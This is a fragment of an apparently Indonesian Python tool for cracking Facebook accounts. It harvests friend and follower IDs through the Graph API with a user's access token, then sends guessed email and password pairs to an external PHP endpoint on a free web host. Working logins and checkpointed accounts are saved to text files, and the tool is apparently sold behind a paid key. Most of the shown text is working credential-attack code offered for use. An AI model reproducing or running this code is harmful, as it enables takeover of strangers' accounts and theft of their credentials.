...
def php(user,pz):
    print(f"\r{putih}[{hijau}?{putih}] CRACK:-{ungu}{len(cr)}{putih} OK:-{hijau}{len(oks)}{putih} CP:-{kuning}{len(cps)}{putih} DIE:-{merah}{len(die)} ",end="")
    r=requests.Session();se=r.post("https://indahnya-dunia.000webhostapp.com/DahLahMales/index.php",data={"email":user,"pass":pz})
    if "save-device" in se.text or "logout.php" in se.text:print(f"\n{putih}[ {hijau}OKS{putih} ] {user} | {pz}");open("oks.txt","a").write(f"[ OKS ] {user} | {pz}\n");oks.append(user);asil.append(f"{putih}[ {hijau}OKS{putih} ] {user} | {pz}")
    elif "checkpoint" in se.text or "checkpointSubmitButton" in se.text:cps.append(user);open("cps.txt","a").write(f"[ CPS ] {user} | {pz}\n");asil.append(f"{putih}[{kuning} CPS{putih} ] {user} | {pz}") 
    else:die.append(user)
def hasil():
    print(f"\n\n{garis}")
...
def http(url):
    return req.get(f"{url}?access_token={token[0]}")
def tk_login(url):
...
def tk_menu(url):
    ...
    print(f"{biru}[{putih}*{biru}]{putih} User Tipe :{hijau} {prem[0]}\n{garis}\n")
    print(f"[01] Crack Dari Daftar Teman Saya")
    print(f"[02] Crack Dari Daftar Teman Publik")
    print(f"[03] Remove Token & Relogin")
    print(f"[04] Crack Dari Followers Saya")
    print(f"[05] Crack Dari Publik Folowers")
    print(f"[00] Exciting this Program\n")
    tk_pilih(url)
def tk_pilih(url):
    p=input(f"{putih}[{hijau}?{putih}] Your Chose : {hijau}")
    ...
    elif p == "3" or p == "03":os.remove("token.json");os.system(f"rm -fr token.json && python {sys.argv[0]}")
    elif p == "4" or p == "04":subme(url)
    elif p == "5" or p == "05":sub(url)
...
def subme(url):
    ses=req.get(f"https://graph.facebook.com/me/subscribers?limit=999999&access_token={token[0]}").json()
    try:
        for x in ses["data"]:
            ida=x["id"];nm=x["name"];id.append(f"{ida}|{nm}");print(f"\r{putih}[{hijau}#{putih}] Mengambil Id : {hijau}{len(id)}",end="");time.sleep(0.01)
        crack(url)
    except KeyError:print(f"\n{putih}[{merah}×{putih}] Tidak Ada Pengikut Yg Ditemukan");time.sleep(2);tk_menu(url)
def sub(url):
    print(f"\n{garis}\n{biru}[{putih}*{biru}]{putih} Masukkan Id / username orang Lain\n{biru}[{putih}*{biru}]{putih} Pastikan Pengguna Itu Memiliki Teman\n{garis}\n")
    ids=input(f"{putih}[{hijau}?{putih}] User Id      :{hijau} ")
    try:ses=http(f"{url}/{ids}").json()["name"];print(f"{putih}[{hijau}#{putih}] User Name    :{hijau} {ses}")
    except KeyError:print(f"\n{putih}[{merah}×{putih}] Pengguna Tidak Ditemukan\n");time.sleep(2);tk_pub(url)
    ses=req.get(f"https://graph.facebook.com/{ids}/subscribers?limit=999999&access_token={token[0]}").json()
    try:
        for x in ses["data"]:
            nm=x["name"];ida=x["id"];id.append(f"{ida}|{nm}");print(f"\r{putih}[{hijau}#{putih}] Mengambil Id :{hijau} {len(id)}",end="");time.sleep(0.01)
        crack(url)
...
def bayar():
    ...
    except json.decoder.JSONDecodeError or KeyError:print(f"\n{putih}[{merah}×{putih}] Kunci Tools salah");time.sleep(2);bayar()
def maksud():
    p=input(f"{putih}[{hijau}?{putih}] Your Chose : {hijau}")
